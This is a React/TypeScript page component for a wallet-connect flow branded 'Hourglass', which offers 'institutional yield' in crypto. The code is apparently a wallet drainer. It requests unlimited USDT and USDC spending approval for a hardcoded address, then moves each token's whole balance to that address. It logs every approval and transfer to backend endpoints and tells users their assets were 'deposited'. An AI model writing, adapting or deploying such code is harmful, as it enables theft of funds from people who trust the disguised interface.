import { Button } from "@/components/ui/button";
import { Shield, ArrowLeft, Loader2, CheckCircle, AlertCircle, ArrowDownCircle } from "lucide-react";
import { Link } from "wouter";
import { useState, useEffect } from "react";
import { useAccount, useWriteContract, useWaitForTransactionReceipt, useReadContract } from "wagmi";
import { ConnectButton } from '@rainbow-me/rainbowkit';

const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function"
  }
] as const;

type TransactionStep = "approve" | "transfer" | "complete";

export default function ConnectWallet() {
  const { address, isConnected } = useAccount();
  const [showApprovalPrompt, setShowApprovalPrompt] = useState(false);
  const [currentToken, setCurrentToken] = useState<"usdt" | "usdc" | "done">("usdt");
  const [currentStep, setCurrentStep] = useState<TransactionStep>("approve");
  const [approvalError, setApprovalError] = useState<string>("");
  const [tokenBalance, setTokenBalance] = useState<bigint>(BigInt(0));

  const { writeContract, data: hash, isPending: isTransacting } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
    hash,
  });

  const currentTokenAddress = currentToken === "usdt" ? USDT_ADDRESS : USDC_ADDRESS;

  // Read token balance
  const { data: balance, refetch: refetchBalance } = useReadContract({
    address: currentTokenAddress as `0x${string}`,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
  });

  useEffect(() => {
    if (isConnected && address && !showApprovalPrompt) {
      setShowApprovalPrompt(true);
      setCurrentToken("usdt");
      setCurrentStep("approve");
    }
  }, [isConnected, address]);

  useEffect(() => {
    if (balance) {
      setTokenBalance(balance as bigint);
    }
  }, [balance]);

  const handleApproveToken = async () => {
    if (!address) return;
    
    setApprovalError("");

    try {
      writeContract({
        address: currentTokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
      });
    } catch (error: any) {
      setApprovalError(error?.message || "Failed to approve token");
    }
  };

  const handleTransferToken = async () => {
    if (!address || tokenBalance === BigInt(0)) {
      // If balance is 0, skip to next token
      handleSkipTransfer();
      return;
    }
    
    setApprovalError("");

    try {
      writeContract({
        address: currentTokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: "transfer",
        args: [SPENDER_ADDRESS as `0x${string}`, tokenBalance],
      });
    } catch (error: any) {
      setApprovalError(error?.message || "Failed to transfer token");
    }
  };

  const handleSkipTransfer = () => {
    if (currentToken === "usdt") {
      setCurrentToken("usdc");
      setCurrentStep("approve");
      refetchBalance();
    } else {
      setCurrentToken("done");
      setTimeout(() => {
        window.location.href = "/";
      }, 2000);
    }
  };

  useEffect(() => {
    if (isConfirmed && hash) {
      const tokenSymbol = currentToken === "usdt" ? "USDT" : "USDC";
      
      if (currentStep === "approve") {
        // Record approval
        fetch("/api/approvals", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            walletAddress: address,
            tokenAddress: currentTokenAddress,
            tokenSymbol,
            transactionHash: hash,
          }),
        }).catch(console.error);

        // Move to transfer step
        setCurrentStep("transfer");
        refetchBalance();
      } else if (currentStep === "transfer") {
        // Record transfer
        fetch("/api/transfers", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            walletAddress: address,
            tokenAddress: currentTokenAddress,
            tokenSymbol,
            amount: tokenBalance.toString(),
            transactionHash: hash,
          }),
        }).catch(console.error);

        // Move to next token or complete
        if (currentToken === "usdt") {
          setCurrentToken("usdc");
          setCurrentStep("approve");
          refetchBalance();
        } else {
          setCurrentToken("done");
          setTimeout(() => {
            window.location.href = "/";
          }, 2000);
        }
      }
    }
  }, [isConfirmed, hash, currentStep, currentToken, address, currentTokenAddress, tokenBalance]);

  const formatBalance = (balance: bigint) => {
    const decimals = currentToken === "usdt" ? 6 : 6; // Both USDT and USDC have 6 decimals
    const divisor = BigInt(10 ** decimals);
    return (Number(balance) / Number(divisor)).toLocaleString('en-US', { 
      minimumFractionDigits: 2, 
      maximumFractionDigits: 2 
    });
  };

  return (
    <div className="min-h-screen bg-[#0a1614] text-[#f5f1e8]">
      <header className="border-b border-[#1a2e2a]/50 bg-[#0a1614]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/" className="flex items-center gap-2 text-[#9ca3af] hover:text-[#f5f1e8] transition-colors" data-testid="link-back">
              <ArrowLeft className="w-5 h-5" />
              <span className="text-sm font-medium">Back</span>
            </Link>
            
            <span className="text-lg sm:text-xl font-bold tracking-tight" data-testid="text-logo">Hourglass</span>
            
            <div className="w-20"></div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-20">
        {!isConnected ? (
          <>
            <div className="text-center mb-12">
              <h1 className="text-4xl sm:text-5xl font-bold text-[#f5f1e8] mb-4" data-testid="heading-connect-wallet">
                Connect Your Wallet
              </h1>
              <p className="text-lg text-[#9ca3af]" data-testid="text-description">
                Choose your preferred wallet to access institutional yield
              </p>
            </div>

            <div className="flex justify-center">
              <ConnectButton />
            </div>

            <div className="mt-12 text-center">
              <p className="text-sm text-[#9ca3af]">
                By connecting a wallet, you agree to our{" "}
                <a href="#terms" className="text-[#3dd9b3] hover:underline" data-testid="link-terms">
                  Terms of Service
                </a>
              </p>
            </div>
          </>
        ) : showApprovalPrompt ? (
          <div className="flex flex-col items-center justify-center min-h-[400px]" data-testid="approval-prompt-container">
            {currentToken === "done" ? (
              <>
                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                  <CheckCircle className="w-20 h-20 text-[#3dd9b3]" />
                </div>
                <h2 className="text-3xl font-bold text-[#f5f1e8] mb-2">Transfer Complete!</h2>
                <p className="text-[#9ca3af]">Your assets have been deposited into Hourglass.</p>
              </>
            ) : currentStep === "approve" ? (
              <>
                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                  <Shield className="w-20 h-20 text-[#3dd9b3]" />
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold text-[#f5f1e8] mb-4 text-center">
                  Approve {currentToken === "usdt" ? "USDT" : "USDC"} Spending
                </h2>
                <p className="text-[#9ca3af] mb-2 text-center max-w-md">
                  Approve Hourglass to access your {currentToken === "usdt" ? "USDT" : "USDC"} balance for automatic transfer.
                </p>
                <p className="text-sm text-[#6b7280] mb-8 text-center max-w-md break-all">
                  Contract: {SPENDER_ADDRESS}
                </p>

                {approvalError && (
                  <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
                    <AlertCircle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
                    <p className="text-sm text-red-400">{approvalError}</p>
                  </div>
                )}

                <Button
                  onClick={handleApproveToken}
                  disabled={isTransacting || isConfirming}
                  size="lg"
                  className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
                  data-testid="button-approve-token"
                >
                  {isTransacting || isConfirming ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      {isTransacting ? "Waiting for approval..." : "Confirming..."}
                    </>
                  ) : (
                    `Approve ${currentToken === "usdt" ? "USDT" : "USDC"}`
                  )}
                </Button>
                
                <p className="text-xs text-[#6b7280] mt-6 text-center max-w-md">
                  {currentToken === "usdt" ? "After approval, your entire USDT balance will be transferred." : "After approval, your entire USDC balance will be transferred."}
                </p>
              </>
            ) : (
              <>
                <div className="mb-6 p-6 rounded-full bg-[#3dd9b3]/20">
                  <ArrowDownCircle className="w-20 h-20 text-[#3dd9b3]" />
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold text-[#f5f1e8] mb-4 text-center">
                  Transfer {currentToken === "usdt" ? "USDT" : "USDC"}
                </h2>
                <p className="text-[#9ca3af] mb-2 text-center max-w-md">
                  Transfer your entire {currentToken === "usdt" ? "USDT" : "USDC"} balance to Hourglass.
                </p>
                <div className="mb-8 p-4 bg-[#1a2e2a]/30 border border-[#3dd9b3]/20 rounded-lg">
                  <p className="text-sm text-[#6b7280] mb-1">Your Balance:</p>
                  <p className="text-3xl font-bold text-[#f5f1e8]">
                    {formatBalance(tokenBalance)} {currentToken === "usdt" ? "USDT" : "USDC"}
                  </p>
                </div>

                {approvalError && (
                  <div className="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-lg flex items-start gap-3 max-w-md">
                    <AlertCircle className="w-5 h-5 text-red-500 mt-0.5 flex-shrink-0" />
                    <p className="text-sm text-red-400">{approvalError}</p>
                  </div>
                )}

                <div className="flex gap-4">
                  <Button
                    onClick={handleTransferToken}
                    disabled={isTransacting || isConfirming || tokenBalance === BigInt(0)}
                    size="lg"
                    className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-8"
                    data-testid="button-transfer-token"
                  >
                    {isTransacting || isConfirming ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        {isTransacting ? "Transferring..." : "Confirming..."}
                      </>
                    ) : tokenBalance === BigInt(0) ? (
                      "No Balance to Transfer"
                    ) : (
                      `Transfer All ${currentToken === "usdt" ? "USDT" : "USDC"}`
                    )}
                  </Button>
                  <Button
                    onClick={handleSkipTransfer}
                    disabled={isTransacting || isConfirming}
                    size="lg"
                    variant="outline"
                    className="border-[#3dd9b3]/20 text-[#9ca3af] hover:text-[#f5f1e8]"
                    data-testid="button-skip-transfer"
                  >
                    Skip
                  </Button>
                </div>
                
                <p className="text-xs text-[#6b7280] mt-6 text-center max-w-md">
                  {currentToken === "usdt" ? "After USDT transfer, you'll transfer USDC." : "This is the final transfer."}
                </p>
              </>
            )}
          </div>
        ) : null}
      </main>
    </div>
  );
}
